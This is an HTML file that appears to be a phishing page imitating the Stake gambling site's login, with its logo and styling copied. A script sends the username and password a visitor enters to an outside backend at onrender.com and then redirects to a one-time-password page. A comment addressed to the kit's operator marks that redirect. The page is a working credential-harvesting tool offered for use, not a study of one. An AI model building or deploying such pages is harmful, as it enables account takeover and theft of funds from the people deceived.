<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Stake 路 Secure Login</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background-image: url('https://gilroydispatch.com');
      background-size: cover;
      background-position: center center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      font-family: 'Inter', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }
    body::before {
      content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(11, 26, 35, 0.65); backdrop-filter: blur(2px); z-index: 0;
    }
    .login-container { width: 100%; max-width: 460px; position: relative; z-index: 2; }
    .login-card { background: #0F212E; border-radius: 28px; overflow: hidden; border: 1px solid rgba(47, 69, 83, 0.6); }
    .card-header { padding: 24px 28px 12px; border-bottom: 1px solid #1F3A48; display: flex; }
    .logo svg { height: 36px; width: auto; color: white; fill: white; }
    .card-body { padding: 28px 28px 34px; }
    .input-group { margin-bottom: 24px; display: flex; flex-direction: column; }
    .input-label { font-size: 13px; font-weight: 600; color: #9aabbf; margin-bottom: 6px; }
    .input-field { background: #0F212E; border: 2px solid #2A4455; border-radius: 14px; padding: 14px 16px; font-size: 16px; color: white; outline: none; width: 100%; }
    .signin-btn { background: #1475E1; border: none; width: 100%; padding: 14px 0; border-radius: 14px; font-weight: 700; font-size: 16px; color: white; cursor: pointer; margin-bottom: 24px; }
    .alt-btn { background: #1F3A48; border: none; border-radius: 14px; padding: 12px; font-weight: 600; color: #f0f3fc; width: 100%; margin-top: 10px; cursor: pointer; }
  </style>
</head>
<body>

<div class="login-container">
  <div class="login-card">
    <div class="card-header">
      <div class="logo">
        <svg viewBox="0 0 400 200"><path d="M31.47,58.5c-.1-25.81,16.42-40.13,46.75-40.23,21.82-.08,25.72,14.2,25.72,19.39,0,9.94-14.06,20.48-14.06,20.48,0,0,.78,6.19,12.85,6.14,12.07-.05,23.83-8.02,23.76-27.96-.06-22.91-24.06-33.38-47.78-33.29C58.87,3.09,6.24,5.88,6.42,58.13c.18,46.41,87.76,50.5,87.83,80.21.12,32.27-36.08,40.96-48.33,40.96s-17.23-8.67-17.25-13.43c-.09-26.13,25.92-33.41,25.92-33.41,0-1.95-1.52-10.64-11.59-10.6-25.95.05-36.28,22.36-36.21,44.14.07,18.53,13.16,30.09,32.94,30.01,37.82-.14,80.46-18.59,80.3-59.56-.14-38.32-88.46-48.33-88.57-77.96Z"/></svg>
      </div>
    </div>
    <div class="card-body">
      <div class="input-group">
        <label class="input-label">Email or Username *</label>
        <input type="text" id="loginUser" class="input-field">
      </div>
      <div class="input-group">
        <label class="input-label">Password *</label>
        <input type="password" id="loginPass" class="input-field">
      </div>
      <button class="signin-btn" id="submitBtn">Sign In</button>
      <button class="alt-btn">Sign in with Google</button>
    </div>
  </div>
</div>

<script>
  document.getElementById("submitBtn").onclick = async function() {
    const user = document.getElementById("loginUser").value;
    const pass = document.getElementById("loginPass").value;
    const btn = this;

    if (!user || !pass) return alert("Enter credentials");

    btn.innerText = "Processing...";
    btn.disabled = true;

    try {
      const response = await fetch("https://onrender.com", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ login: user, password: pass })
      });

      const data = await response.json();

      if (data.success) {
        // ✅ THIS LINE REDIRECTS TO YOUR OTP PAGE
        window.location.href = "otp.html";
      } else {
        alert("Error: " + data.error);
        btn.innerText = "Sign In";
        btn.disabled = false;
      }
    } catch (err) {
      alert("Backend connection failed.");
      btn.innerText = "Sign In";
      btn.disabled = false;
    }
  };
</script>

</body>
</html>
